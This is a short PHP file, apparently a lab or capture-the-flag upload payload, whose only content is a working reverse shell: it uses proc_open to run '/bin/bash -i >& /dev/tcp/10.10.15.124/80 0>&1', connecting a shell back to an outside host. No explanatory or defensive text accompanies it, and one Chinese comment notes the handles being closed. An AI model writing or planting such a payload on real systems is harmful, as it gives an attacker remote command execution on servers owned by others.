<?php
$cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.15.124/80 0>&1'";

$descriptorspec = array(
    0 => array('file', '/dev/null', 'r'),
    1 => array('file', '/dev/null', 'w'),
    2 => array('file', '/dev/null', 'w')
);

$process = proc_open($cmd, $descriptorspec, $pipes, null, null);

if (is_resource($process)) {
    // 关闭所有句柄
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process); 
}
?>
